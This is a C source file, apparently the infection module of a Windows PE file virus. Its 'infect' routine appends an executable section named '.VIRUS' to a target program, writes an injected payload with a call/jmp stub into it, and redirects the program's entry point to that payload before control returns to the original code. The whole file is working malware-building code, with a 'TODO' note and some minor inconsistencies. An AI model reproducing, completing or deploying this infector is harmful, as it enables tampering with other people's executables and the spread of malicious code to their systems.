#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#include "type.h"
#include "pe.h"
#include "infect.h"

#define INJECTION_TAIL_SIZE 10
#define FILLED_INJECTION_SIZE 0x1000

u8 injection_tail[INJECTION_TAIL_SIZE] = {
    '\xe8', '\x00', '\x00', '\x00', '\x00',  // call near rel16
    '\xe9', '\x00', '\x00', '\x00', '\x00' // jmp rel32
};
u8 filled_injection[FILLED_INJECTION_SIZE];
u8 * file;
u32 address_of_entry_point_new;

u8 test[5];
extern int off;
extern char injection[];
extern int INJECTION_SIZE_RAW;


inline int WriteFileAt(HANDLE file_handle, void* data, u32 size_to_write,u64 point){
    u32 response;
    response = SetFilePointer(
        file_handle,
        point,
        NULL,
        FILE_BEGIN
    );
    if(response == INVALID_SET_FILE_POINTER){
        return FALSE;
    }
    u32 size_written;
    response = WriteFile(
        file_handle,
        data,
        size_to_write,
        &size_written,
        NULL
    );
    if(response == FALSE){
        return FALSE;
    }
    return TRUE;
}

void AdjustInjection(u8 injection[]){ // TODO complete this!
    address_of_entry_point_new = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment;
    u32 target = address_of_entry_point_old - address_of_entry_point_new - 5 - 5; // because jmp is the second instruction
    u32 function = off + 10 - 5;
    INFO("new target = %d\n", target);
    INFO("function = 0x%x\n", function);
    memcpy(injection_tail + 1, &function, 4);
    memcpy(injection_tail + 6, &target, 4);
    memcpy(filled_injection, injection_tail, INJECTION_TAIL_SIZE);
    memcpy(filled_injection + INJECTION_TAIL_SIZE, injection, INJECTION_SIZE_RAW);
#ifndef NDEBUG
    for(int i = 0; i < INJECTION_SIZE_RAW + INJECTION_TAIL_SIZE;i ++ ){
        printf("%02x ", filled_injection[i]);
        if(i % 32 == 31){
            printf("\n");
        }
    }
    printf("\n");
#endif
}

void infect(u8 injection[], HANDLE file_handle){
    INFO("new entry rva = %x", address_of_entry_point_new);
    int injection_size = INJECTION_SIZE_RAW + INJECTION_TAIL_SIZE;
    u32 virtual_size = injection_size;
    u32 virtual_address = section_headers[number_of_sections_old - 1].VirtualAddress + section_alignment;
    int file_alignment_num;
    file_alignment_num = injection_size / file_alignment;
    if(injection_size % file_alignment > 0){
        file_alignment_num ++;
    }
    u32 size_of_raw_data = file_alignment_num * file_alignment;

    u32 pointer_to_raw_data = section_headers[number_of_sections_old - 1].PointerToRawData + 
                              section_headers[number_of_sections_old - 1].SizeOfRawData;
    u32 characteristic = 0xe00000e0; // readable, writeable, executable, contains code and data.


    struct SectionHeader header = {
        .Name = ".VIRUS\0",
        .Misc.VirtualSize = virtual_size,
        .VirtualAddress = virtual_address,
        .SizeOfRawData = size_of_raw_data,
        .PointerToRawData = pointer_to_raw_data,
        .PointerToRelocations = 0,
        .PointerToLinenumbers = 0,
        .NumberOfRelocations = 0,
        .NumberOfLinenumbers = 0,
        .Characteristics = characteristic
    };

    InfoSectionHeader(header);

    WriteFileAt(file_handle, &header, SECTION_HEADER_SIZE, section_tables_end_old);
    WriteFileAt(file_handle, filled_injection, FILLED_INJECTION_SIZE,sections_end_old);

    // adjust some args
    u16 number_of_sections_new = number_of_sections_old + 1;
    u32 size_of_image_new = size_of_image_old + section_alignment;
    WriteFileAt(
        file_handle,
        &number_of_sections_new,
        2,
        NT_header_off + NT_HEADER__FILE_HEADER_OFF + FILE_HEADER__NUMBER_OF_SECTION_OFF
    );
    WriteFileAt(
        file_handle,
        &address_of_entry_point_new,
        4,
        NT_header_off + NT_HEADER__OPTIONAL_HEADER_OFF + OPTIONAL_HEADER__ADDRESS_OF_ENTRY_POINT_OFF
    );
    WriteFileAt(
        file_handle,
        &size_of_image_new,
        4,
        NT_header_off + NT_HEADER__OPTIONAL_HEADER_OFF + OPTIONAL_HEADER__SIZE_OF_IMAGE_OFF
    );
    return 0;
}